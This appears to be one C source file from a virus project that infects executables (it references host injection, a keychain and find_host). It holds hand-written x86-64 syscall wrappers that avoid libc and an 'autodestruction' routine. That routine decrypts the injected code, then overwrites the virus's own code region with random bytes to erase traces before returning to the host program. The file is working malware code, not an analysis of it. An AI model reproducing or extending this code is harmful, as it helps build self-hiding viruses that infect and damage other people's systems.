#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
{
	void *ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"
		"mov edx, %2\n"
		"mov r10d, %3\n"
		"mov r8d, %4\n"
		"mov r9, %5\n"

		"mov rax, 0x9\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _open(const char *filename, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(filename), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
{
	ssize_t ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov rdx, %2\n"

		"mov rax, 0x1\n"
		"syscall\n"
		:
		: "g"(fd), "g"(buf), "g"(count)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _munmap(void *addr, size_t length)
{
	int ret = 0;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"

		"mov rax, 0xb\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags)
{
	ssize_t ret;

	__asm__ volatile (
			"mov rdi, %0\n"
			"mov rsi, %1\n"
			"mov edx, %2\n"

			"mov rax, 0x13e\n"
			"syscall\n"
			:
			: "g"(buf), "g"(buflen), "g"(flags)
			);
	__asm__ (
			"mov %0, rax\n"
			: "=r"(ret)
			:
		);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

__attribute__((always_inline)) static inline void _bzero(char *str, const size_t size)
{
	if (str == NULL)
		return ;

	for (register size_t index = 0; index < size; index++)
		str[index] = 0;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

#if DEBUG
	char function[] = "autodestruction:\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	char *entry;
	const size_t size = (void *)autodestruction - (void *)find_host;
	char buf[size];

	entry = (char *)find_host;

	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
		_bzero(buf, size);

	for (register size_t index = 0; index < size; index++)
		entry[index] = buf[index];

	__exit(host->stack);
}
